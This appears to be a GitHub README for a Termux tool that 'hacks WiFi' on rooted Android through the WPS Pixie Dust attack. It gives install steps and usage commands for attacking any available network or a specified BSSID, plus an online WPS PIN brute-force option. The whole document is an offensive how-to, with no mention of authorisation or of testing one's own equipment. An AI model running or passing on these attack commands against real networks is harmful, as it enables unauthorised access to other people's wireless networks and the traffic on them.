## Pixie Dust Attack (PDA)
## Hack Wifi Using Termux! (Requires Root)

<p align="center"><img src="https://i.ibb.co/K74g0SC/hulu.jpg"></p>

## Installation :

```bash
$ apt update && apt upgrade
$ pkg install -y root-repo
$ pkg install -y git tsu python3 wpa-supplicant pixiewps iw
$ git clone https://github.com/abukayuum/pixiewps
$ cd pixiewps
$ chmod +x pixiewps.py
$ sudo python3 pixiewps.py --help
```

## Help : `python3 pixiewps.py --help`
## Example : `sudo python3 pixiewps.py -i wlan0 -K`

## Note: 
**First turn off your Wifi.**
- Show avaliable networks and start Pixie Dust attack on a specified network.
- `sudo python pixiewps.py -i wlan0 -K`
- - Start Pixie Dust attack on a specified BSSID:
`sudo python pixiewps.py -i wlan0 -b 00:91:4C:C3:AC:28 -K`
- Launch online WPS bruteforce with the specified first half of the PIN:
- `sudo python pixiewps.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234`
### Troubleshooting
**"Device or resource busy (-16)" - Turn on Wifi and Then Turn off Wifi.**
